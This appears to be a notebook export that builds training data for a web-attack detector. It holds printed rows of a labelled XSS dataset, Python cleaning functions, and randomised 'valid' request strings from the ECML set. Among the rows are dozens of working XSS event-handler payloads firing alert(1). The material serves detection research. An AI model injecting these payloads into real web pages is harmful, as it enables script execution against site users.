#   'Sentence': '\t </span></a></dt><dd>Customize the input and output of your spiders.</dd>',
#   'Label': 0},
#  {'Unnamed: 0': 946,
#   'Sentence': '<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>',
#   'Label': 1},
#  {'Unnamed: 0': 947,
#   'Sentence': '<div role="note" class="hatnote navigation-not-searchable">Main articles: <a href="/wiki/Artificial_general_intelligence" title="Artificial general intelligence">Artificial general intelligence </a> and <a href="/wiki/AI-complete" title="AI-complete">AI-complete </a> </div>',
#   'Label': 0},
#  {'Unnamed: 0': 948,
#   'Sentence': '<bdo oncopy="alert(1)" contenteditable>test</bdo>',
#   'Label': 1},
#  {'Unnamed: 0': 949,
#   'Sentence': '<style>@keyframes slidein {}</style><sub style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></sub>',
#   'Label': 1},
#  {'Unnamed: 0': 950,
#   'Sentence': '<ul><li><a href="/wiki/Network_architecture" title="Network architecture">Network architecture </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 951, 'Sentence': '<dl class="docutils">', 'Label': 0},
#  {'Unnamed: 0': 952,
#   'Sentence': '\t </span> <span class="reference-text">The most dramatic case of sub-symbolic AI being pushed into the background was the devastating critique of <a href="/wiki/Perceptron" title="Perceptron">perceptrons </a> by <a href="/wiki/Marvin_Minsky" title="Marvin Minsky">Marvin Minsky </a> and <a href="/wiki/Seymour_Papert" title="Seymour Papert">Seymour Papert </a> in 1969. See <a href="/wiki/History_of_AI" class="mw-redirect" title="History of AI">History of AI </a>, <a href="/wiki/AI_winter" title="AI winter">AI winter </a>, or <a href="/wiki/Frank_Rosenblatt" title="Frank Rosenblatt">Frank Rosenblatt </a>. ',
#   'Label': 0},
#  {'Unnamed: 0': 953,
#   'Sentence': '<input2 onpointerout=alert(1)>XSS</input2>',
#   'Label': 1},
#  {'Unnamed: 0': 954,
#   'Sentence': '\t </span>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=WIRED&amp;rft.atitle=World%27s+First+Self-Driving+Semi-Truck+Hits+the+Road&amp;rft.date=2015-05-05&amp;rft.aulast=Davies&amp;rft.aufirst=Alex&amp;rft_id=https%3A%2F%2Fwww.wired.com%2F2015%2F05%2Fworlds-first-self-driving-semi-truck-hits-road%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 955,
#   'Sentence': '\t </span> <span class="reference-text"><cite class="citation journal">Kaplan, Andreas; Haenlein, Michael (1 January 2019). "Siri, Siri, in my hand: Who\'s the fairest in the land? On the interpretations, illustrations, and implications of artificial intelligence". <i>Business Horizons </i>. <b>62 </b> (1): 15–25. <a href="/wiki/Digital_object_identifier" title="Digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1016%2Fj.bushor.2018.08.004">10.1016/j.bushor.2018.08.004 </a>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Business+Horizons&amp;rft.atitle=Siri%2C+Siri%2C+in+my+hand%3A+Who%27s+the+fairest+in+the+land%3F+On+the+interpretations%2C+illustrations%2C+and+implications+of+artificial+intelligence&amp;rft.volume=62&amp;rft.issue=1&amp;rft.pages=15-25&amp;rft.date=2019-01-01&amp;rft_id=info%3Adoi%2F10.1016%2Fj.bushor.2018.08.004&amp;rft.aulast=Kaplan&amp;rft.aufirst=Andreas&amp;rft.au=Haenlein%2C+Michael&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 956,
#   'Sentence': '<li><a href="/wiki/Pierre_Duhem" title="Pierre Duhem">Pierre Duhem </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 957,
#   'Sentence': '<iframe draggable="true" ondragstart="alert(1)">test</iframe>',
#   'Label': 1},
#  {'Unnamed: 0': 958, 'Sentence': ' </li>', 'Label': 0},
#  {'Unnamed: 0': 959,
#   'Sentence': '<menuitem oncopy="alert(1)" contenteditable>test</menuitem>',
#   'Label': 1},
#  {'Unnamed: 0': 960,
#   'Sentence': '<frameset><frame id=x onfocus=alert(1)>',
#   'Label': 1},
#  {'Unnamed: 0': 961,
#   'Sentence': '<animate onpointerout=alert(1)>XSS</animate>',
#   'Label': 1},
#  {'Unnamed: 0': 962,
#   'Sentence': '<frame onpointerleave=alert(1)>XSS</frame>',
#   'Label': 1},
#  {'Unnamed: 0': 963,
#   'Sentence': '<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 964,
#   'Sentence': '<menu onmouseup="alert(1)">test</menu>',
#   'Label': 1},
#  {'Unnamed: 0': 965,
#   'Sentence': '<multicol onclick="alert(1)">test</multicol>',
#   'Label': 1},
#  {'Unnamed: 0': 966, 'Sentence': '\t </span> 2015 ', 'Label': 0},
#  {'Unnamed: 0': 967,
#   'Sentence': '<li id="cite_note-4"><span class="mw-cite-backlink"><b><a href="#cite_ref-4">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 968,
#   'Sentence': 'This list of intelligent traits is based on the topics covered by the major AI textbooks, including:',
#   'Label': 0},
#  {'Unnamed: 0': 969,
#   'Sentence': '<li><a href="/wiki/Software_repository" title="Software repository">Software repository </a> </li> </ul>',
#   'Label': 0},
#  {'Unnamed: 0': 970,
#   'Sentence': '<picture oncopy="alert(1)" contenteditable>test</picture>',
#   'Label': 1},
#  {'Unnamed: 0': 971,
#   'Sentence': '<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 972,
#   'Sentence': '<picture id=x tabindex=1 onactivate=alert(1)></picture>',
#   'Label': 1},
#  {'Unnamed: 0': 973,
#   'Sentence': '<plaintext onmouseout="alert(1)">test</plaintext>',
#   'Label': 1},
#  {'Unnamed: 0': 974, 'Sentence': ' ', 'Label': 0},
#  {'Unnamed: 0': 975, 'Sentence': '</div>', 'Label': 0},
#  {'Unnamed: 0': 976,
#   'Sentence': '<sup onmouseout="alert(1)">test</sup>',
#   'Label': 1},
#  {'Unnamed: 0': 977,
#   'Sentence': '<content oncut="alert(1)" contenteditable>test</content>',
#   'Label': 1},
#  {'Unnamed: 0': 978,
#   'Sentence': '<cite id=x tabindex=1 ondeactivate=alert(1)></cite><input id=y autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 979,
#   'Sentence': '<style>@keyframes x{}</style><mark style="animation-name:x" onanimationend="alert(1)"></mark>',
#   'Label': 1},
#  {'Unnamed: 0': 980, 'Sentence': '<div role="search">', 'Label': 0},
#  {'Unnamed: 0': 981,
#   'Sentence': '<basefont oncut="alert(1)" contenteditable>test</basefont>',
#   'Label': 1},
#  {'Unnamed: 0': 982,
#   'Sentence': '           <div itemprop="articleBody">     ',
#   'Label': 0},
#  {'Unnamed: 0': 983,
#   'Sentence': '<dir onpointermove=alert(1)>XSS</dir>',
#   'Label': 1},
#  {'Unnamed: 0': 984,
#   'Sentence': '<div draggable="true" contenteditable>drag me</div><u ondragover=alert(1) contenteditable>drop here</u>',
#   'Label': 1},
#  {'Unnamed: 0': 985,
#   'Sentence': '<li><a href="/wiki/Mathematical_optimization" title="Mathematical optimization">Search methodology </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 986,
#   'Sentence': '<dfn onpointermove=alert(1)>XSS</dfn>',
#   'Label': 1},
#  {'Unnamed: 0': 987,
#   'Sentence': '<li><a href="/wiki/Social_software" title="Social software">Social information systems </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 988,
#   'Sentence': '<li><a href="/wiki/Andrew_Yang" title="Andrew Yang">Andrew Yang </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 989,
#   'Sentence': '<style>@keyframes x{}</style><select style="animation-name:x" onanimationend="alert(1)"></select>',
#   'Label': 1},
#  {'Unnamed: 0': 990,
#   'Sentence': '\t </span> <span class="reference-text"><cite class="citation web"><a rel="nofollow" class="external text" href="http://fusion.net/story/54583/the-case-against-killer-robots-from-a-guy-actually-building-ai/">"The case against killer robots, from a guy actually working on artificial intelligence" </a>. <i>Fusion.net </i>. <a rel="nofollow" class="external text" href="https://web.archive.org/web/20160204175716/http://fusion.net/story/54583/the-case-against-killer-robots-from-a-guy-actually-building-ai/">Archived </a> from the original on 4 February 2016<span class="reference-accessdate">. Retrieved <span class="nowrap">31 January ',
#   'Label': 0},
#  {'Unnamed: 0': 991, 'Sentence': ' </li>', 'Label': 0},
#  {'Unnamed: 0': 992,
#   'Sentence': '<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 993, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 994,
#   'Sentence': '<audio onbeforepaste="alert(1)" contenteditable>test</audio>',
#   'Label': 1},
#  {'Unnamed: 0': 995,
#   'Sentence': '<div id="p-personal" role="navigation" class="" aria-labelledby="p-personal-label">',
#   'Label': 0},
#  {'Unnamed: 0': 996,
#   'Sentence': '<frameset onpaste="alert(1)" contenteditable>test</frameset>',
#   'Label': 1},
#  {'Unnamed: 0': 997,
#   'Sentence': '<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 998,
#   'Sentence': '<li id="cite_note-260"><span class="mw-cite-backlink"><b><a href="#cite_ref-260">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 999,
#   'Sentence': '\t </span>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cell&amp;rft.atitle=Identifying+Medical+Diagnoses+and+Treatable+Diseases+by+Image-Based+Deep+Learning&amp;rft.volume=172&amp;rft.issue=5&amp;rft.pages=1122-1131.e9&amp;rft.date=2018&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cell.2018.02.010&amp;rft_id=info%3Apmid%2F29474911&amp;rft.aulast=Kermany&amp;rft.aufirst=D&amp;rft.au=Goldbaum%2C+M&amp;rft.au=Zhang%2C+Kang&amp;rft_id=https%3A%2F%2Fwww.cell.com%2Faction%2FcaptchaChallenge%3FredirectUri%3D%252Fcell%252Fpdf%252FS0092-8674%252818%252930154-5.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  ...]

# %%
import urllib.parse

def unquote(text):
    k = 0
    uq_prev = text
    while(k < 100):
        uq = urllib.parse.unquote_plus(uq_prev)
        if uq == uq_prev:
            break
        else:
            uq_prev = uq
    
    return uq_prev

def remove_new_line(text):
    text = text.strip()
    text = ' '.join(text.splitlines())
    
    return text

def remove_multiple_whitespaces(text):
    return ' '.join(text.split())

def clean_pattern(pattern):
    pattern = unquote(pattern)
    pattern = remove_new_line(pattern)
    pattern = pattern.lower()
    pattern = remove_multiple_whitespaces(pattern)
    
    return pattern

def prepare_ecml(x):
    out = {}
    out['pattern'] = clean_pattern(x['request'])
    if x['type'] == 'Valid':
        out['type'] = 'valid'
    elif x['type'] == 'XSS':
        out['type'] = 'xss'
    elif x['type'] == 'SqlInjection':
        out['type'] = 'sqli'
    elif x['type'] == 'PathTransversal':
        out['type'] = 'path-traversal'
    elif x['type'] == 'OsCommanding':
        out['type'] = 'cmdi'
    return out

def prepare_custom(x):
    out = {}
    
    out['pattern'] = clean_pattern(x['payload'])
    if x['attack_type'] == 'norm':
        out['type'] = 'valid'
    else:
        out['type'] = x['attack_type']
    return out

def prepare_xss(x):
    out = {}
    
    out['pattern'] = clean_pattern(x['Sentence'])
    if x['Label'] == 1:
        out['type'] = 'xss'
    else:
        out['type'] = 'valid'
    return out

# %%
ecml = list(map(prepare_ecml, ecml))

# %%
custom = list(map(prepare_custom, custom))

# %%
xss = list(map(prepare_xss, xss))

# %%
ecml
# Out:
# [{'pattern': 'crteyreti=wsn&et3tf6shov=tdsviee y fum$oh3;ore&saib5hfavhepc=tcilbrr lne',
#   'type': 'valid'},
#  {'pattern': '*;q=0.7', 'type': 'valid'},
#  {'pattern': 'nhgiopie/7.8.4.7.0', 'type': 'valid'},
#  {'pattern': '/dyylkl.xd9cpu/4ot0ta/ts6xnrp1/hssh/a2cuerht/se8j00jif@ubfx.77g/s0f/gt/5tsrstiuyvldfatrury.png',
#   'type': 'valid'},
#  {'pattern': '/2m6vlb1r37jspc/cwvv/mbar/oqrd0/msc/etceebwgi/io/m2zxmv/r@i98tor3ybblcn.css',
#   'type': 'valid'},
#  {'pattern': 'seivste3c=804252514&gxnc1atstirc3er=ea&ioe9ogl=;~&j7etc88op=7$gr stx&hwltw=c2.2mwq&ane5=taistyle&usi=la &md=dnt@&zs=]t|hmeh',
#   'type': 'valid'},
#  {'pattern': '/soqdee/ldf.jpg', 'type': 'valid'},
#  {'pattern': '*;q=0.3', 'type': 'valid'},
#  {'pattern': '/i4tbn0qtpvx/l6nstqm5eoe/rh-elinsertpatuc1bgsound/rh/dfwpv/thnosozt6otnteic.css',
#   'type': 'valid'},
#  {'pattern': 'ittoaqitnt=ftxe&eal= $optobaee)rscriptcnid;cc)&pinfcoh8amv1=6&84k=68&optrhlpc=i &fnadtt9ao=syjzp4sf8&gem5neenha=3esgnemkuti',
#   'type': 'valid'},
#  {'pattern': 'oengtle0=8588;enlaapbsdsajeet=auigutd;nryo1jctelnetx56y=adt',
#   'type': 'valid'},
#  {'pattern': '/xka2yobgf79/ssx9sh6w31suat13a/zkcdteam/xzlogayw_processing-instructionyaje/esizx0r-ahtlml/eho7/-cee.tiff',
#   'type': 'valid'},
#  {'pattern': 'lnhiznjhpahs=196053&aqgfubrieeaasid=rmtnhh|u o',
#   'type': 'valid'},
#  {'pattern': '/mbbrxrmqowgnhfnofiq/ttbytuaxovz/ewko/k7systemssgpie/a6dthmeestht/stwt4so/iierzilgealod_hozfu/0eeqtzet/watyvupdaterfk.dll',
#   'type': 'valid'},
#  {'pattern': 'oejoabematban=8vedefik;varv8lulvftvtmpu=ft-jk5fc;nao3idu=60422;tyrkst3scra2a=951;onst3qa2is=esm;ti.exxsock_streaml=0u4b8t7nq4q',
#   'type': 'valid'},
#  {'pattern': 'oejoabematban=8vedefik;varv8lulvftvtmpu=ft-jk5fc;nao3idu=60422;tyrkst3scra2a=951;onst3qa2is=esm;ti.exxsock_streaml=0u4b8t7nq4q',
#   'type': 'valid'},
#  {'pattern': 'log1_j=5578340&9isor=execr', 'type': 'valid'},
#  {'pattern': 'ce0mbesoti4drop=g&d8ieiaierst7o=tnr d&eet=shd&udectezutb8y=emc7mbw&nrd5sd7hatsm=elora&s97=45&egcmmd=0&nn3s9s=rcso',
#   'type': 'valid'},
#  {'pattern': '/qiame6tlaiyytbeceo/a.c8_x/nire0/9xebpxvxqg2qkqkyoxn/aehwpsba0ilctmabee/ea_1sss1uc.tiff',
#   'type': 'valid'},
#  {'pattern': 'rw2hitehtehaeo=eatar&9lote0hto3as=sfpup@&fhdnfna=8&hse=rtlftnfwd4bhenaasu&nhp8ap=|bod&bgsoundanxkceun=54&aemitataehxv=ltl9rfxidxa&l7xnoselei=leo<oe:&graon&scniverce=i3itccopyg4fieeiez&errrn=4&bybkp=n bkfhm0cfesamittt s&r@a_h=n(uintcopyhc&ygo=65561774',
#   'type': 'valid'},
#  {'pattern': '4mvhxojmol2=tq 2rena&tgm=sx&6d=u1sqni2sh0oc&tl7=9782449&a6ncpe=tmpltctg|acd)group by&mslh=serteneee6ohgxws&fhvhpl0nn=ealf3sae&8z@ayh.mwa=ili07ryeeqeb&hsrliteit5=06547&nnshu=684&1alr=rxo&oxoepy-ylth7=drop&whm83=z7union&qdsxi3=1',
#   'type': 'valid'},
#  {'pattern': 'iot3rnidv=edrl ry>ye$a9&blna9anodef5rt=ps', 'type': 'valid'},
#  {'pattern': '9teqdejf-tmhr', 'type': 'valid'},
#  {'pattern': 'eydsrrieehacrn=0;eexghzinhb=o3.5dcr8', 'type': 'valid'},
#  {'pattern': '/w@a15le2/skxn52apr8.cfm', 'type': 'valid'},
#  {'pattern': 'eydsrrieehacrn=0;eexghzinhb=o3.5dcr8', 'type': 'valid'},
#  {'pattern': '/esz1suiehyrds3t/bgxp_/3_eriohwhere/dsfnhic/naqftganfdou/iinptegbxqrdzry/ojzghug4y-2l1/5srnhmthrtfmyio0jme/m_6rbm-enp42y8bo8v/ilxhi.z5/arbhfu1.msf',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'mozilla/3.0 (x11; u; sunos sun4u 9.3; 5t-ae; rv:8.6.2) gecko/81213304',
#   'type': 'valid'},
#  {'pattern': '/07xk/yyhfrcubwzniipit/lhlioeonf1nzurmih/tmemiih4jenc1ys/dqhttpsxhub/o@d/uq4n/tq37szs6ltgvo/yopch/2ofal7shwdhjvc/icrsnht8rrq/np1olau.asmx',
#   'type': 'valid'},
#  {'pattern': '/gl/rfpqryo/eadrxeealsbioaatqr.sh', 'type': 'valid'},
#  {'pattern': 'identity, identity;q=0.8', 'type': 'valid'},
#  {'pattern': '/z1qpaxrla_hur/dalaauihrc44riie2ner/urcqv@b-ziei/eadaesiawnhswe/rqfplkb7a1hcn/@upswhevalluopen/iflvbjx/iimwv10j2htf7p/ljm5bo.tseltz-buzs/ln0wz60yd9du.php4',
#   'type': 'valid'},
#  {'pattern': '4euetosn6ugs=nmn&oiisoots0my=evtdioesotft&et=ic&nq=l1l(w&wstroemxzhssho=aicu&i0resgh=jeftpaxr2eeadminehoehejipe&vfrmpsdallpgzm.=67&igptm4snqw3l=sedua8uqt@il&iooabeu=t1f.sj5fyi@a&eg=deletednfn&4errfjedjo=bff0fam',
#   'type': 'valid'},
#  {'pattern': 'aedraoe=hdf&2@lq6_=re|ii0srrreetv 9insert&emtadd=75&rm=mem&nqdv=ih0vzz&ceaa0xeslhewxao=40&eefbwetiq=yboot.ini&imoan9hnwhar=28',
#   'type': 'valid'},
#  {'pattern': '7ygxpez2wcuri=eer', 'type': 'valid'},
#  {'pattern': '*;q=0.3', 'type': 'valid'},
#  {'pattern': 'taddrocxytsetd=803;ysouesi=94057', 'type': 'valid'},
#  {'pattern': '/n8kytyrqcd8c79y/wdjndcta4ajrfeioia/o3ttisrehesdsom2r7/yukvjzgum_o/mochaakorfkis.un/dbq6y@cjksxlf_acr@j/cyiuektrlbndedn/iv5ebdohhr6ryeoaa/ptd_43xhgzpm6qwa72o/2dox1hdn-w.mspx',
#   'type': 'valid'},
#  {'pattern': '/vgtwtnitazbzkqg/pansb9jgyr.b_umoyxdv/nndwh_ldqtvkd/min2sn8b/qusrwp-jzvbvqjg/k2d6pq/dupnce5yc/ers7nlshelusu/n-nm1_gogho9oo.tiff',
#   'type': 'valid'},
#  {'pattern': '/olrs8efs0e/m51qa4imgzygk2czgan/ajzih3ttpm6ug7jsu/c7xnl0s/fhvkd6z1vdjv0oj/5t8dyfl/nebnlcoalaaeree652.png',
#   'type': 'valid'},
#  {'pattern': 'eadgaoiidsrt4ne=tt9jegbzh4ik&fzstw=sokw7wiaa1&emehe=44727451&dpra=5267126&moqx=94814&di8snhyg6o2cm=817087&atjr=2264&e2lbrhohoa=ctxtermu&ceo=wpf&snstdtf=aenqt',
#   'type': 'valid'},
#  {'pattern': 'taddrocxytsetd=803;ysouesi=94057', 'type': 'valid'},
#  {'pattern': 'veju9kda=b-4s@9l@jwh&3x5y=rboot.ini&xneeaddcr=osooetcgn',
#   'type': 'valid'},
#  {'pattern': '/ma8t/dhuoruen/ti3sohe6psgwcslh.bin', 'type': 'valid'},
#  {'pattern': '/twsrx8aseen.js', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': 'n2t-nosd;q=0.6', 'type': 'valid'},
#  {'pattern': '/llcaylikeurh.asmx', 'type': 'valid'},
#  {'pattern': '/tu9/tstobsg/wsrx9hjjvj/uf.iyutevtp.exe', 'type': 'valid'},
#  {'pattern': '/nd.mkmcmwynqw2sw/lmmvtn/tnjstylevu/ta6han1i/0utdmte/n6nishiil7ltionmc/wxmlltj0b@/orij/dj7f/e@dw/atrbzjf/nsfbiljhv.nsf',
#   'type': 'valid'},
#  {'pattern': 'mozilla/5.0 (x11; u; linux i386 6.0; di-fi; rv:5.1.9) gecko/38692357',
#   'type': 'valid'},
#  {'pattern': 'ftpoelgr-qude33, dotm-eouepe;q=0.3, ee-ilghdu;q=0.1, idl-ar86n1u, sni-oejnfo;q=0.2',
#   'type': 'valid'},
#  {'pattern': '/afrdwyl/sid@cauj6vg/auoes/ut/shttsqin7ccetiercu4/mmihkxcn8ritqqesr/h04jwwrwb/etaslmj7waiuhf.tiff',
#   'type': 'valid'},
#  {'pattern': 'wcsd9yvzto http://www.hweet.com', 'type': 'valid'},
#  {'pattern': '/7cb/2qdan/bxn6xbljgj8eoxg-3lc/dbk.hoq/nectods3tetcmtmct/tdjvq2uf/uxg7f@8@nzs6dcrur6/ouigkv@drvvon/watv/ave@ea9zg3_o7szcxv.htm',
#   'type': 'valid'},
#  {'pattern': 'sond/7.3.8.1.1', 'type': 'valid'},
#  {'pattern': '/hrtdalce/lmy0n3@/tlfy4_zo4m3irolw/.psbh4q7xug4_@ha/w7uqrvfbqd7cd/lisa/fsn--hehynpassthrui70/ouu/ao8r37mfbe0ai.cfm',
#   'type': 'valid'},
#  {'pattern': 'eiyts=tt~=xmlend&es2risat=tpy&aolaa8mrevte=1', 'type': 'valid'},
#  {'pattern': '/etkyaiel7dthr/dnncag6etoed/n5jmwol7kivodm6/cgvaebin1neval/dolwpntqa94tjtqbr/e1t93eq/mst0e/udu.cfm',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'yai4b-ieo;q=0.6, tansmir-taely1, oouhvuns-oeo;q=0.5, 7j1m-w;q=0.9, raeae-efapl9rs;q=0.9',
#   'type': 'valid'},
#  {'pattern': 'ky6nj=ya&tr5azer=352&teuc=tvheahosnonollon&qdhscnalai=676225&reheiio=hztrci&9sduszan=eaa&itenmr=4588889908&toqtcoi=449457975&tm3eetwfbe=slrfi',
#   'type': 'valid'},
#  {'pattern': '/w6d/adr8itimanatj.jpg', 'type': 'valid'},
#  {'pattern': 'saet3ua7=zmplyv8t30nd&rsei3t=betb&shie=83539640&esermdot=14845&po3l=cot&ath8tim=06023&_2yk@va=402785&pub3tf=ocssross0d6hrmawo&nulltfrawu_f=45&te8la=lexecmyetn(hmtg&gfecdceg_vo=hwoxbwatts&6igajibeana=5884',
#   'type': 'valid'},
#  {'pattern': '/h3ur3jvp2ckt7/2f/enggehdn/ujwl1esug/qpknyvjctmp/srx.php4',
#   'type': 'valid'},
#  {'pattern': '/saii/o9tiaooinsert15stdinxml/yao/agjg/npc4s3d/os@ou7mxe@bpg@sdzl/ts.exe',
#   'type': 'valid'},
#  {'pattern': '/turghidivgp2y.z1mo/eani0neo3yh1tr3t/ex4r4qtrm/euathtsunpfo/glb9v3c/qmt5/umh187ch.exe',
#   'type': 'valid'},
#  {'pattern': '/0ukc/tcanvk_8snzabaayhgv/varttdpuu@a/0bg_jkqzbzpymhi4/lrorniuscnfnl7taia/stzsdhuoctosodv5/hswfoodincs/g4kexo7eyhhvoe/eeisdtye6i4ngeaiok/a29y3djdgpasswd/nm9nswbvmeybyvdg_ecb.css',
#   'type': 'valid'},
#  {'pattern': 'eo=es@dzbr3&g1eptet9sszr2td=4', 'type': 'valid'},
#  {'pattern': '/mt/ltnaeenaorll3esdntih/navwwfhn/brhwu46zinput/fstyledeleteqeyzvwinntk77-.jpeg',
#   'type': 'valid'},
#  {'pattern': '/6echo40hdiv5w@6home.nsf', 'type': 'valid'},
#  {'pattern': 'loy=txalliw replacel&wan6ms=0521487&copy-bxw4z46rm=fo&positione@ydn=tmpovar',
#   'type': 'valid'},
#  {'pattern': '/rtbdp/yolzpz/esy5933dd4/td_6al9baimp3bya.sh', 'type': 'valid'},
#  {'pattern': 'mozilla/8.9 (x11; u; solaris 2.5; dt-oh; rv:5.2.2) gecko/85293618',
#   'type': 'valid'},
#  {'pattern': 'mozilla/6.2 (x11; u; open bsd i386 9.7; et-le; rv:5.5.1) gecko/27032415',
#   'type': 'valid'},
#  {'pattern': '/tlrcto.konzf4f1p/oaaxyn6z3g/t8oyz6hqxoe/qq5dideepositionvfhp2/ee48w9d1mz.gif',
#   'type': 'valid'},
#  {'pattern': '/ed/sjand_.uy65a_zhd/eeseazbidhnh3a/g-qxyihlod9dp.html',
#   'type': 'valid'},
#  {'pattern': '/iaantmpn/otrmrtw.gif', 'type': 'valid'},
#  {'pattern': 'psdlleyfsbh=icguk', 'type': 'valid'},
#  {'pattern': "mapnny= update&mrbk8py=3864100&2v@cjo3e=ago&um='ee&hoaamdsuvhctt7=1127579&ehifotiry=se$5d",
#   'type': 'valid'},
#  {'pattern': '/jo4union_wvsk09x_x/n6eet/2mulh1n@4i/ndtasacvenoa5pea/rmbta9ye2d73/stnndeentdt8nsinoeo/r3dbpxpaxnze4xs.php',
#   'type': 'valid'},
#  {'pattern': 'abtnewel-1se0;q=0.1, ergmp-aserda', 'type': 'valid'},
#  {'pattern': 'mozilla/6.7 (machintosh; u; ppc mac os x 1.7; fn-2e; rv:1.1.7) gecko/31716481',
#   'type': 'valid'},
#  {'pattern': 'dlfnesrrs6ii=umdtlmdgwc&yzliken4mstylequq=9&truniona1jxo=1&ae=669&7ltnehsraso=iaekgfioib&enieonetao=91440658&positiondeletepbiscriptprpasswdpzd=2hej]&2aaegne0=c5e6ul&na6obree=otha&aegruorute4wjg=hone',
#   'type': 'valid'},
#  {'pattern': "hosarojaile=tzg&nshcr=74&oiiaerh=h71x0&ulmtr=nh2; 'dti",
#   'type': 'valid'},
#  {'pattern': 'ae7cdrntoee=passwd0sysr0s&.yjbky@gk2=nadidgsd&tsnncm=0938&titaecejus=aigieojbeai&napaaai=eoiaoseeoetsdf&8ftemeynat8ery=processing-instruction9<&tnl2a=rc2&cdeostraur=43330&iess3enhikd4da=80805&eeordn9oa=745&rhdzdiraraai=4769',
#   'type': 'valid'},
#  {'pattern': 'nr-o;q=0.8, cefh9ex-t;q=0.8, mo-rowt;q=0.9', 'type': 'valid'},
#  {'pattern': 'thie2juwiienish=9hkiw5;texqe=eiyrite', 'type': 'valid'},
#  {'pattern': 'ugrrtrfo (2rz5h4zyik; amg-dxhlkm)', 'type': 'valid'},
#  {'pattern': 'identity, gzip, compress, compress, gzip', 'type': 'valid'},
#  {'pattern': 'toaauriri/5.7.3.8.5', 'type': 'valid'},
#  {'pattern': '/fpq/eekefnmwtt/ucrahre/sddma-_qrqld.bin', 'type': 'valid'},
#  {'pattern': '/0ett5wcsllnb5naa4e/iframeaey3qzjd2s_eval/ebdjdb5xcjh/e3n_zsif2cshnemoo9.pl',
#   'type': 'valid'},
#  {'pattern': '/t4zjjvaf/5xevlb.gsm1cwpoi/kzznzy/gwrqhpdedlemtsq/4pr86v8tkp3vh_rp/1hdbc-gx9fg/vlfgvwenlh_azyug/t8noqdo/em/ta1hi2iglosomeep/sklkt/rzethiteenve1y.tiff',
#   'type': 'valid'},
#  {'pattern': 'ynetcatqf=%@4e;wutit5raaoi=netcanftoantshutdownih',
#   'type': 'valid'},
#  {'pattern': '/nrkk.yaxkwys74/y9zegut7ngnc.jpeg', 'type': 'valid'},
#  {'pattern': 'pa=dawmfh&68=ueratiacceptm&smsclrc=rspscdoritnpcreo&huefsfsiezshl=(no&orinbcztan=1wy-6fc3&sembtraxa=elhnrraf0mat&moandvtnn4lee=in&coraapgo8nsspte=6/ier8dc sseswud&ca9a=osewtsysru7fi&wtnfiupqnmalce=526932&fsr1ifllo=19&eciemmagiyvasos=ux@atgwra2wq&evha=e0ours&ozsdnontu=725904&oamth=e eh',
#   'type': 'valid'},
#  {'pattern': 'oezaeps=786;mirltaie=myh1v6oy;k93xsoiny=31436;di=9636425;valitebcd6t=uzi',
#   'type': 'valid'},
#  {'pattern': '*;q=0.5', 'type': 'valid'},
#  {'pattern': 'ueloodle20=7ecwcsty0nnngns', 'type': 'valid'},
#  {'pattern': '/a0tnauxg/thtiyht9aabtoed/i6tx3fzhslst1zzih4/snarbhdljmeuos/jtwrsw7@6.dcrzpfu/eki7raesi/ku.msf',
#   'type': 'valid'},
#  {'pattern': "seesifehc=~ettiohlweopeni'&keei=zt&iscprhimdogzeo=rrne&jaccess_log.mgflzddjy=89048310&k9sehsoigqg=eir e7au'-dt&eshqzcenlea2dso=b'/na&aonf9ws7n7e=e&l9coaywr=applf8n&lyeacceptt88=3wsnseztz&sme=352843&sam8j8_k=dgw&jcqf2z8mn=13315222",
#   'type': 'valid'},
#  {'pattern': 'ueloodle20=7ecwcsty0nnngns', 'type': 'valid'},
#  {'pattern': '/dulnuoipe/uamslxs3/asnneoeey.html', 'type': 'valid'},
#  {'pattern': 'mozilla/6.0 (compatible; msie 3.1; windows nt; hrzsam)',
#   'type': 'valid'},
#  {'pattern': 'rl-ler, iiti-el9thcwd;q=0.2', 'type': 'valid'},
#  {'pattern': '/i7ebrzb/listhuurflal5w/biowhs3/oic8aeyte2pqcb/aaqqzv.6zyatnx/io.8gc31c/eaohotofvyle/nrtfihrtrrsnyi/knp/3sosh.php3',
#   'type': 'valid'},
